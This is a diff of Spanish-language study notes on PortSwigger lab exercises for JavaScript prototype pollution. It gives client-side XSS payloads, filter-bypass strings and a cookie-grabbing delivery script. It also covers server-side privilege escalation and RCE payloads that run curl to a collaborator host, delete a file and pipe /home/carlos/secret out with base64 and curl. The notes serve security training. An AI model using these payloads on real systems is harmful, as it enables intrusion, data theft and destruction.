@@ -1,83 +1,66 @@
+### **¿Qué es la contaminación prototipo?**
+
+La contaminación por prototipos es una vulnerabilidad JavaScript que permite a un atacante añadir propiedades arbitrarias a los prototipos de objetos globales, que luego pueden ser heredados por objetos definidos por el usuario.
+
+> Nota: Es importante entender que, tanto el prototipo de la instancia de un objeto (al cual se accede mediante [Object.getPrototypeOf(obj)](https://developer.mozilla.org/es/docs/Web/JavaScript/Reference/Global_Objects/Object/getPrototypeOf), o a través de la propiedad [__proto__](https://developer.mozilla.org/es/docs/Web/JavaScript/Reference/Global_Objects/Object/proto)) como el prototipo que contiene el constructor (que se encuentra en la propiedad prototype del constructor) hacen referencia al mismo objeto.
+
+## Qué es un prototipo en JavaScript?
+
+Cada objeto en JavaScript está vinculado a otro objeto de algún tipo, conocido como su prototipo. De forma predeterminada, JavaScript asigna automáticamente nuevos objetos uno de sus prototipos incorporados. Por ejemplo, las cadenas se asignan automáticamente el incorporado `String.prototype`. Puedes ver algunos ejemplos más de estos prototipos globales a continuación:
+
 ```
-Use DOM Invader with prototype pollution function to automate the search while navigating
+let myObject = {};
+Object.getPrototypeOf(myObject);    // Object.prototype
 
+let myString = "";
+Object.getPrototypeOf(myString);    // String.prototype
 
-manual tests:
-/?__proto__[foo]=bar 
+let myArray = [];
+Object.getPrototypeOf(myArray);	    // Array.prototype
+
+let myNumber = 1;
+Object.getPrototypeOf(myNumber);    // Number.prototype
+```
+
+![[Pasted image 20260810215036.png]]
+Los objetos heredan automáticamente todas las propiedades de su prototipo asignado, a menos que ya tengan su propia propiedad con la misma clave. Esto permite a los desarrolladores crear nuevos objetos que puedan reutilizar las propiedades y métodos de los objetos existentes.
+
+Como con cualquier propiedad, se puede acceder `__proto__`utilizando una anotación o punto:
+
+```js
+username.__proto__
+username['__proto__']
+
+//Incluso puedes encadenar referencias a __proto__ para trabajar su camino hasta la cadena prototipo:
+
+username.__proto__                        // String.prototype
+username.__proto__.__proto__              // Object.prototype
+username.__proto__.__proto__.__proto__    // null
+```
+
+---
+## DOM Invader extension - Browser integrado burp - Nuestro mejor amigo para esta Prototype Pollution.
+
+* Use DOM Invader with prototype pollution function to automate the search while navigating
+## Manual Test
+
+```js
+/?__proto__[foo]=bar
+?__proto__.foo=bar 
 /?constructor.prototype.foo=bar
+/?__pro__proto__to__[foo]=bar
+/?__pro__proto__to__.foo=bar 
+/?constconstructorructor[protoprototypetype][foo]=bar 
+/?constconstructorructor.protoprototypetype.foo=bar
+?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
+/?__proto__.property="value"
+/?Object.constructor.prototype.property="value"
 
-
-Avoid filter by commenting the url with a '-' at the end
-
-
-Spot filter on js script
-let badProperties = ['constructor','__proto__','prototype'];
-    for(let badProperty of badProperties) {
-        key = key.replaceAll(badProperty, '');
-    }
--> Not recursive
--> /?__pro__proto__to__[foo]=bar
--> /?__pro__proto__to__.foo=bar 
--> /?constconstructorructor[protoprototypetype][foo]=bar 
--> /?constconstructorructor.protoprototypetype.foo=bar
-(all work)
--> identify sink: script.src = config.transport_url;
--> exploit: /?__pro__proto__to__[transport_url]=data:,alert(1);
-
-
-Deliver to victim a prototype pollution XSS
-<script>
- location="https://0aba00c003066a7a814d89c100fc0030.web-security-academy.net/#__proto__[hitCallback]=alert%281%29"
-</script>
-
-
-Priv Escalation:
-Update settings request shows isadmin value in response
-Can be modified in burpsuite, adding:
-"__proto__": { "foo":"bar" }
-this will add the foo param
-
-restart node and update isAdmin value to true
-"__proto__":{"isAdmin":true}
-
-
-
-No reflection
--> "__proto__":{"status":555}
--> Force an error (remove a coma) and check if status object has been updated to 555
-
-
-
-Try updating spaces:
-"__proto__": { "json spaces":10 }
-"constructor": { "prototype": { "json spaces":10 } }
--> In response switch to Raw to check indentation
--> "constructor": { "prototype": { "isAdmin":true } }
-
-
-
-RCE
-Pollute user settings
-"__proto__": {
- "execPath":"curl","execArgv":["https://YOUR-COLLABORATOR-ID.oastify.com","."]
-}
-
-or the one of this lab:
-
-"__proto__": {
-    "execArgv":["--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
-    ]
-}
-
-After that, trigger admin job to trigger the execArgv
-
-
-carlos secret??
-
-"__proto__": { "shell":"vim", "input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n" }
+//Desde console > Object.prototype Para ver si se añadio correctamente foo bar
 ```
 
-##### Automation guide:
+### Automation guide:
+
 1. Load the lab in Burp's built-in browser.
 2. [Enable DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) and [enable the prototype pollution option](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution).
 3. Open the browser DevTools panel, go to the **DOM Invader** tab, then reload the page.
@@ -86,77 +69,250 @@ carlos secret??
 6. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.
 7. Observe that DOM Invader has successfully accessed the `script.src` sink via the `value` gadget.
 8. Click **Exploit**. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.
-##### To manually test:
-- `/?__proto__[foo]=bar`
-- Object.prototype on the console to see if foo is injected
-- Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks. Ex: `Object.defineProperty()` method to make the `transport_url` unwritable and unconfigurable
-- - Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a `data:` URL as follows:
-    `/?__proto__[value]=data:,alert(1);`
 
+### LAB: DOM XSS Vía Client Side Prototype Pollution 
 
+* Propiedad encontrada: `transport_url` 
+* identify sink: script.src = config.transport_url;
 
-##### If filter is appended:
-1. Go back to the previous browser tab and look at the `eval()` sink again in DOM Invader. Notice that following the closing canary string, a numeric `1` character has been appended to the payload.
-2. Click **Exploit** again. In the new tab that loads, append a minus character (`-`) to the URL and reload the page.
-3. Observe that the `alert(1)` is called and the lab is solved.
-
-##### rstrip filter
-1. Go to the **Sources** tab and study the JavaScript files that are loaded by the target site. Notice that `deparamSanitized.js` uses the `sanitizeKey()` function defined in `searchLoggerFiltered.js` to strip potentially dangerous property keys based on a blocklist. However, it does not apply this filter recursively.
-2. Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitization process. For 
-    `/?__pro__proto__to__[foo]=bar /?__pro__proto__to__.foo=bar /?constconstructorructor[protoprototypetype][foo]=bar /?constconstructorructor.protoprototypetype.foo=bar`
-3. In the console, enter `Object.prototype` again. Notice that it now has its own `foo` property with the value `bar`. You've successfully found a prototype pollution source and bypassed the website's key sanitization.
-4. Find transport_url is appended to the config object
-	`__pro__proto__to__[transport_url]=data:,alert(1);`
-
-##### Deliver to victim
 ```js
+ID-LAB.net/?__proto__[transport_url]=data:,alert(1);//
+```
+
+### LAB: DOM XSS Vía Alternative Prototype pollution Vector
+
+* Importante: siempre ver el inspector>depurador para analizar los files `JS`que hayan, pueden darnos la base de nuestro ataque. 
+
+```js
+?__proto__.sequence=alert(1)-
+?constructor.prototype.sequence=alert(1)-
+//DE LAS DOS FORMAS FUNCIONó. 
+```
+
+### LAB: Prototype Pollution Via flawed sanitization
+
+* Una función pobre que intenta prohibir palabras como `constructor, prototype, __proto__` - ingenuos. 
+
+```js
+/?__pro__proto__to__[foo]=bar //funciono, test inicial.
+
+/?__pro__proto__to__[transport_url]=data:,alert(1);//
+```
+
+### LAB: DOM XSS Prototype Pollution in third party libraries `cookie`
+
+* Un objetivo es vulnerable a DOM XSS a través de la contaminación de prototipos del lado del cliente. **DOM Invader** identificará el gadget y utilizando una carga útil alojada para realizar phishing dirigido a la víctima y robar su **cookie**.
+![[Pasted image 20260810215216.png]]
+
+Además de ello toca en la sección >Attack Types activar la opción que dice “Protoype Pollution is on” para que de está forma empiece a buscar en el código, si muchas veces se usa codigo e terceros posiblemente puede estar ofuscado o minificado el cual es dificil de entender a ojo, por lo cual con esta extensión posiblemente podemos ahorrarnos un tiempo extra el cual me sirve para cuando esté haciendo el BSCP.
+
+![[Pasted image 20260810215220.png]]
+
+* Dom invader hace su magia, le damos >scan  for gadgets, encontramos el `hitCallback` propiedad, lo explotamos y listo. 
+
+```js
+/feedback#__proto__[hitCallback]=alert%281%29
+//o para testear: 
+/feedback#__proto__[foo]=bar
+//y en consola ponemos Object.prototype si nos arroja el foo:"bar", sabemos que
+//efectivamente se hizo la contaminacion del prototipo clave:valor foo:bar
+
+//PAYLOAD FINAL - En exploit SERVER: 
 <script>
- location="https://0aba00c003066a7a814d89c100fc0030.web-security-academy.net/#__proto__[hitCallback]=alert%281%29"
+	location="https://ID-LAB.web-security-academy.net/feedback#__proto__[hitCallback]=alert%28document.cookie%29"
 </script>
+//store & deliver exploit to victimc
+//Revisar en los logs del server. 
 ```
 
-##### Privilege escalaion
-```
-Update settings can be modified in burpsuite, adding:
-"__proto__": { "foo":"bar" }
-this will add the foo param
+### LAB: DOM XSS Prototype Pollution Vía Browser API's
 
-restart node and update isAdmin value to true
-"__proto__": { isAdmin:true }
-```
-![[Pasted image 20240208221121.png]]
+* En este caso los desarrolladores se dieron cuenta del gadget `transport_url` y quisieron mandarlo a dormir simplemente con el {configurable:false, writable:false} xd
 
-##### Force an error
-remove the coma of the previous setting and update the status to 500
-```
-"__proto__":{"status":555}
-```
+![[Pasted image 20260810215227.png]]
 
+* A prueba manual llegue a la primera opción, pero con DOM INVADER se creó la carga util por completo: 
 
-##### If settings are reflected in JSON
-try updating spaces:
-```
-"__proto__": { "json spaces":10 }
+```js
+//ESTE LO CREE YO MANUALMENTE CON BASE AL CODIGO DEL LAB y el research de portswigger 
+/?__proto__[config.transport_url]=alert(config.transport_url);
+//pero para que realmente se pueda ejecutar el alert toca hacer la codificación a URL asi tal cual como nos lo proveé el DOM Invader!! ->
 
-"constructor": { "prototype": { "json spaces":10 } }
+//DOM Invader 
+/?__proto__%5Bconfig.transport_url%5D=alert%28config.transport_url%29&__proto__[value]=data%3A%2Calert%281%29
+
+/?__proto__[config.transport_url]=alert(config.transport_url)&__proto__[value]=data:,alert(1)
 ```
 
+### LAB: Prototype pollution Privilege Escalation 
 
-##### prototype pollution RCE
-```
-"__proto__": {
- "execPath":"curl","execArgv":["https://YOUR-COLLABORATOR-ID.oastify.com","."]
+```js
+//En el endpoint POST /my-account/change-address, se procesa la info en un JSON
+//y su response en JSON too, contiene algo chido. 
+{"isAdmin":false}
+
+//Segun lo que dice gareth heyes
+"__proto__": { "foo":"bar" } //se ve en la response? VULNERABLE
+
+{
+"INFO-DEL-LAB":"COLOMBIA HP",
+"__proto__":{
+	"isAdmin":true
 }
+//ESO FUEQUE. 
+```
 
-or the one of this lab:
 
+### LAB: Prototype Pollution without polluted property reflection
+
+Este lab no es de explotación sino de confirmación en sí, por lo cual debo encontrar el indicio que me confirme el prototype pollution.
+
+¿Que tengo que hacer sino es una explotación?
+
+Muy simple, verificar si contiene en su backend el UTF-7 Charset y si en la respuesta no se ve reflejado, significa que no, por lo cual podría inyectar un `__proto__` con el **content-type** con el charset en utf-7 y luego volver a enviar la petición a ver si da.
+
+- UTF-7 → foo: `+AGYAbwBv-`
+
+```jsx
+{
+"address_line_1":"Wiener HQ",
+"address_line_2":"One Wiener Way",
+"city":"Wienerville",
+"postcode":"BU1 1RP",
+"country":"+AGYAbwBv-",
+"sessionId":"NHwQLxaDVcQnOlQZwYPIJW47juDC4t7E"
+}
+```
+
+Sino devuelve en la respuesta de country **foo** entonces no admite la encoding UTF-7 y podriamos hacer lo que dije del content type, de lo contrario si y entonces no sería la forma de explotación, en este caso si no devuelve foo sino la codificación, entonces voy a inyectarle el content-type con la property `__proto__`
+
+```jsx
+{
+"address_line_1":"Wiener HQ",
+"address_line_2":"One Wiener Way",
+"city":"Wienerville",
+"postcode":"BU1 1RP",
+"country":"Colombia",
+"__proto__":{ 
+		"content-type": "application/json; charset=utf-7" 
+	},
+"sessionId":"NHwQLxaDVcQnOlQZwYPIJW47juDC4t7E"
+}
+```
+
+![[Pasted image 20260810215246.png]]
+
+Y en la otra ventana del repeater mando la prueba de nuevo a ver si está vez si me devuelve `foo`
+
+![[Pasted image 20260810215249.png]]
+
+Y efectivamente si, con esto ya se confirma la vulnerabilidad prototype pollution de tipo `Charset Anidation` con el UTF-7 **Content-type**
+
+### LAB:  Prototype Pollution Bypassing flawed input filters
+
+* No acepta `__proto__` ni nada de eso, toca con constructor y proto al tiempo. 
+* Este endpoint que se usa para explotar la vuln es `POST /my-account/change-address HTTP/2`
+
+```js
+//PAYLOAD FINAL -> 
+{
+"constructor":{
+	"prototype":{
+		"isAdmin":true
+		}
+	},
+}
+```
+
+![[Pasted image 20260810215256.png]]
+
+### LAB: RCE via server-side prototype pollution
+
+* Podemos tirar un Json spaces y luego el proto para el RCE, pero luego de insertarlo tenemos que limpiar la DB Cleanup para que se pueda ver reflejado, así que si hay algo de "**Run Maintenance Job** sabemos muy bien que puede ir por este tipo de ataque, o el de abajo Level Expert"
+
+```js
+//SE PUEDE VER IDENTIFICADO EL SPACE GENERADO CON EL JSON SPACES.
+"__proto__":{
+		"json spaces":10
+	}
+
+//PAYLOAD FINAL -> y EJM De COLLABORATOR Para corroborar el RCE
 "__proto__": {
-    "execArgv":["--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
+    "execArgv":[
+        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
     ]
-}
-}
+},
+
+//BORRAR EL ARCHIVO MORALE.TXT
+"__proto__": {
+    "execArgv":[
+        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+    ]
+},
 
 ```
-run maintainance jobs from admin panel to trigger execArgv that is polluted
 
+### LAB: RCE Exfiltrating sensitive data via server-side prototype pollution `Level:Expert`
 
+Analicemos esta request que actualicé el `prueba Colombia hp!`
+
+![[Pasted image 20260810215302.png]]
+
+Puedo inyectar propiedad arbitrarias para el objecto prototipo global, vemos reflejado el foo:bar
+
+Tiremos el comando de vim, de la doc de portswigger:
+
+```jsx
+"shell":"vim",
+"input":":! <command>\\n"
+```
+
+![[Pasted image 20260810215306.png]]
+
+```jsx
+"__proto__":{
+	"shell":"vim",
+	"input":":! curl BURP-COLLABORATOR.com\\n"
+}, //no me tiro resultados, se vió reflejado en el response pero en el collaborator no me llegó nada.
+
+"constructor":{
+	"prototype":{
+		"shell":"vim",
+		"input":"! curl -d @- BURP-COLLABORATOR\\n"	
+	}
+},
+```
+
+Nunca me iba a funcionar si no activaba todo dandole al bendito boton del admin panel, ajajaj:
+
+![[Pasted image 20260810215312.png]]
+
+![[Pasted image 20260810215315.png]]
+
+La pestaña del repeater `Activate RCE - admin/jobs` es precisamente para tirar el cleanupDB que ya conocemos, está pestaña de arriba de la imagen es en la que inserto el comando, que cuando voy al collaborator me aparece el testFelipe encodeado en base64:
+
+![[Pasted image 20260810215356.png]]
+![[Pasted image 20260810215359.png]]
+
+```jsx
+"constructor":{
+	"prototype":{
+		"shell":"vim",
+		"input":"! echo felipe | curl -d @- <https://COLLAB.oastify.com>\n"	
+ 	}
+},
+```
+
+![[Pasted image 20260810215405.png]]
+#### cat /home/carlos/secret → PAYLOAD FINAL.
+
+Entonces seguiré probando con otros comandos como ls, pwd, para ver donde estoy y luego tirar el comando definitivo que me enliste el directorio **/home/carlos** donde pueda ver el `secret`
+
+```jsx
+"constructor":{
+	"prototype":{
+		"shell":"vim",
+		"input":"! cat /home/carlos/secret | base64 | curl -d @- <https://COLLAB.oastify.com>\\n"	
+ 	}
+},
+```
